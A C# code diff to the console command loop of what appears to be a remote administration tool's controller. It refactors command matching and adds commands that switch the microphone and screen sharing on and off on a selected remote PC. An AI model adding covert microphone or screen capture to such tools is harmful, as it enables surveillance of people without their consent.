@@ -25,19 +25,19 @@ public static class ConsoleThread
                 {
                     ServerFunctions.ClearBuffer(Form1.selectedPc);
                 }
-                else if (input == "quit" || input == "close" || input == "exit")
+                else if (IsInValues(input, "exit", "close", "quit"))
                 {
                     ServerFunctions.Parent.Invoke(new Action(() => ServerFunctions.Parent.Close()));
                     System.Threading.Thread.CurrentThread.Abort();
                     break;
                 }
-                else if (input == "screenon")
+                else if(IsInValues(input, "micon", "micoff"))
                 {
-                    ServerFunctions.SetShareScreen(Form1.selectedPc, true);
+                    ServerFunctions.Microphone(Form1.selectedPc, input == "micon");
                 }
-                else if (input == "screenoff")
+                else if(IsInValues(input, "screenon", "screenoff"))
                 {
-                    ServerFunctions.SetShareScreen(Form1.selectedPc, false);
+                    ServerFunctions.SetShareScreen(Form1.selectedPc, input == "screenon");
                 }
                 else
                 {
@@ -64,5 +64,13 @@ public static class ConsoleThread
                 Console.WriteLine(ex);
             }
         }
+    }
+
+    static bool IsInValues(string value, params string[] array) 
+    {
+        for(int i = 0; i < array.Length; i++)
+            if (value == array[i]) return true;
+        
+        return false;
     }
 }
